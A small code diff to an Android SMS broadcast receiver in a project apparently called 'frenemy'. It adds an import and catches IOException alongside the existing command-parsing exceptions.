@@ -13,6 +13,8 @@ import com.theah64.frenemy.android.utils.DarKnight;
 
 import org.apache.commons.cli.ParseException;
 
+import java.io.IOException;
+
 public class SMSReceiver extends BroadcastReceiver {
 
     private static final String X = SMSReceiver.class.getSimpleName();
@@ -87,7 +89,7 @@ public class SMSReceiver extends BroadcastReceiver {
                         }
                     });
 
-                } catch (BaseCommand.CommandException | ParseException | BaseCommand.CommandHelp e) {
+                } catch (BaseCommand.CommandException | ParseException | BaseCommand.CommandHelp | IOException e) {
                     e.printStackTrace();
                 }
 
